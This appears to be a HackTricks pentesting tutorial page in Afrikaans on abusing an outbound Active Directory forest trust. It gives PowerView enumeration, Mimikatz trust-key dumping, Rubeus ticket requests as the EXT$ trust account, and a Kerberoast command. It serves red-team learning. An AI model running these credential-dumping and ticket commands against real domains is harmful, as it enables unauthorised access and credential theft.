# Eksterne Woud-domein - Eenrigting (Uitgaand)

{% hint style="success" %}
Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Rooi Span Ekspert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Rooi Span Ekspert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kyk na die [**subskripsieplanne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

In hierdie scenario **jou domein** is **vertrou** op **sekere voorregte** aan 'n hoof van **verskillende domeine**.

## Opname

### Uitgaande Vertroue
```powershell
# Notice Outbound trust
Get-DomainTrust
SourceName      : root.local
TargetName      : ext.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM

# Lets find the current domain group giving permissions to the external domain
Get-DomainForeignGroupMember
GroupDomain             : root.local
GroupName               : External Users
GroupDistinguishedName  : CN=External Users,CN=Users,DC=DOMAIN,DC=LOCAL
MemberDomain            : root.io
MemberName              : S-1-5-21-1028541967-2937615241-1935644758-1115
MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=ForeignSecurityPrincipals,DC=DOMAIN,DC=LOCAL
## Note how the members aren't from the current domain (ConvertFrom-SID won't work)
```
## Trust Account Attack

'n Sekuriteitskwesbaarheid bestaan wanneer 'n vertrouensverhouding tussen twee domeine gevestig word, hier geïdentifiseer as domein **A** en domein **B**, waar domein **B** sy vertroue na domein **A** uitbrei. In hierdie opstelling word 'n spesiale rekening in domein **A** geskep vir domein **B**, wat 'n belangrike rol speel in die verifikasieproses tussen die twee domeine. Hierdie rekening, geassosieer met domein **B**, word gebruik om kaartjies te enkripteer vir toegang tot dienste oor die domeine.

Die kritieke aspek om hier te verstaan, is dat die wagwoord en hash van hierdie spesiale rekening uit 'n Domeinbeheerder in domein **A** onttrek kan word met behulp van 'n opdraglyn hulpmiddel. Die opdrag om hierdie aksie uit te voer is:
```powershell
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
```
Hierdie ekstraksie is moontlik omdat die rekening, wat met 'n **$** na sy naam geïdentifiseer word, aktief is en behoort tot die "Domain Users" groep van domein **A**, wat die regte wat met hierdie groep geassosieer word, erf. Dit stel individue in staat om teen domein **A** te autentiseer met die kredensiale van hierdie rekening.

**Waarskuwing:** Dit is haalbaar om hierdie situasie te benut om 'n voet aan die grond in domein **A** te verkry as 'n gebruiker, alhoewel met beperkte regte. Hierdie toegang is egter voldoende om enumerasie op domein **A** uit te voer.

In 'n scenario waar `ext.local` die vertrouende domein is en `root.local` die vertroude domein is, sal 'n gebruikersrekening met die naam `EXT$` binne `root.local` geskep word. Deur spesifieke gereedskap is dit moontlik om die Kerberos vertrouingssleutels te dump, wat die kredensiale van `EXT$` in `root.local` onthul. Die opdrag om dit te bereik is:
```bash
lsadump::trust /patch
```
Hierdie kan gebruik word om die onttrokken RC4-sleutel te gebruik om as `root.local\EXT$` binne `root.local` te autentiseer met 'n ander hulpmiddelopdrag:
```bash
.\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt
```
Hierdie verifikasiefase maak die moontlikheid oop om dienste binne `root.local` te tel en selfs te benut, soos om 'n Kerberoast-aanval uit te voer om diensrekening geloofsbriewe te onttrek met:
```bash
.\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
```
### Versameling van duidelike teks vertrouingswagwoord

In die vorige vloei is die vertrouingshash gebruik in plaas van die **duidelike teks wagwoord** (wat ook **deur mimikatz gedump** is).

Die duidelike teks wagwoord kan verkry word deur die \[ CLEAR ] uitvoer van mimikatz van hexadesimaal te omskakel en null bytes ‘\x00’ te verwyder:

![](<../../.gitbook/assets/image (938).png>)

Soms, wanneer 'n vertrouingsverhouding geskep word, moet 'n wagwoord deur die gebruiker vir die vertroue getik word. In hierdie demonstrasie is die sleutel die oorspronklike vertrouingswagwoord en dus menslik leesbaar. Soos die sleutel siklusse (30 dae), sal die duidelike teks nie menslik leesbaar wees nie, maar tegnies steeds bruikbaar.

Die duidelike teks wagwoord kan gebruik word om gereelde outentisering as die vertrouingsrekening uit te voer, 'n alternatief om 'n TGT aan te vra met die Kerberos geheime sleutel van die vertrouingsrekening. Hier, om root.local van ext.local te vra vir lede van Domain Admins:

![](<../../.gitbook/assets/image (792).png>)

## Verwysings

* [https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted)

{% hint style="success" %}
Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
